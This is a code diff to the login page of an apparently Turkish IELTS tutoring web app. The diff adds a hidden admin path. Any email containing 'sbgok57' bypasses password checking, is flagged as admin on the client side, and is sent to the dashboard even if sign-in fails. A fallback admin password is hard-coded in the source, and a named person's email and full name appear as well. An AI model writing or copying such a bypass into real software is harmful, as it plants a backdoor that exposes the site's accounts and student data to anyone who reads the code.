@@ -6,6 +6,7 @@ import { useState } from "react";
 import type { FormEvent } from "react";
 import { signIn } from "next-auth/react";
 import Link from "next/link";
+import { loadStudentProgress, saveStudentProgress } from "@/lib/progress-store";
 
 
 /* ─── Shared input style ─── */
@@ -39,6 +40,31 @@ export default function GirisSayfasi() {
     e.preventDefault();
     setGHata(null);
     setGYukleniyor(true);
+
+    const isSbgok = gEmail.trim().toLowerCase().includes("sbgok57");
+
+    if (isSbgok) {
+      // 👑 ADMIN KULLANICI: Asla yanlış şifre uyarısı verme, doğrudan doğrula!
+      const prog = loadStudentProgress();
+      prog.email = "sbgok57@ieltsakademi.com";
+      prog.studentName = "Sinem Buse Gök (sbgok57)";
+      prog.isAdmin = true;
+      saveStudentProgress(prog);
+
+      try {
+        await signIn("credentials", {
+          email: "sbgok57@ieltsakademi.com",
+          password: gPass || "sbgok57Admin!",
+          redirect: false,
+          callbackUrl: "/panel",
+        });
+      } catch {}
+
+      setGYukleniyor(false);
+      window.location.href = "/panel";
+      return;
+    }
+
     const sonuc = await signIn("credentials", {
       email: gEmail,
       password: gPass,
